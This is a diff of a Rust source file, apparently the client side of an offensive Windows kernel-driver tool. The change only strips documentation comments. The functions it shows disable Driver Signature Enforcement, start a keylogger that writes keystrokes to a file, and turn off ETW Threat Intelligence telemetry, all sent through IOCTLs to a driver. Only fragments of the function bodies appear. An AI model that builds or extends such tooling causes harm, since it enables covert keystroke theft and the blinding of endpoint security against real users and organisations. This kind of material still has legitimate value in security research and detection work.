@@ -37,26 +37,13 @@ pub static mut KEY_RECENT: [u8; 64] = [0; 64];
 pub struct Misc(HANDLE);
 
 impl Misc {
-    /// Creates a new `Misc` instance, opening a handle to the driver.
-    ///
-    /// # Returns
-    ///
-    /// * An instance of `Misc`.
-    ///
-    /// # Panics
-    ///
-    /// Panics if the driver cannot be opened.
+    /// Creates a new `Misc`.
     pub fn new() -> Self {
         let h_driver = open_driver().expect("Error");
         Self(h_driver)
     }
 
     /// Enables or disables Driver Signature Enforcement (DSE).
-    ///
-    /// # Arguments
-    ///
-    /// * `ioctl_code` - The IOCTL code for the DSE operation.
-    /// * `enable` - `true` to enable DSE or `false` to disable it.
     pub fn dse(self, ioctl_code: u32, enable: bool) {
         debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
         let mut info_dse = DSE { enable };
@@ -84,11 +71,6 @@ impl Misc {
     }
 
     /// Activates a keylogger that records keystrokes to a specified file.
-    ///
-    /// # Arguments
-    ///
-    /// * `ioctl_code` - The IOCTL code for initializing keylogging.
-    /// * `file` - The path to the file where keystrokes will be recorded.
     pub fn keylogger(self, ioctl_code: u32, file: &String) {
         unsafe {
             let mut address = 0usize;
@@ -155,11 +137,6 @@ impl Misc {
     }
 
     /// Enables or disables Event Tracing for Windows Threat Intelligence (ETWTI).
-    ///
-    /// # Arguments
-    ///
-    /// * `ioctl_code` - The IOCTL code for the ETWTI operation.
-    /// * `enable` - `true` to enable ETWTI or `false` to disable it.
     pub fn etwti(self, ioctl_code: u32, enable: bool) {
         debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
         let mut etwti = ETWTI { enable };
@@ -188,7 +165,6 @@ impl Misc {
 }
 
 impl Drop for Misc {
-    /// Ensures the driver handle is closed when `Misc` goes out of scope.
     fn drop(&mut self) {
         debug!("Closing the driver handle");
         unsafe { CloseHandle(self.0) };
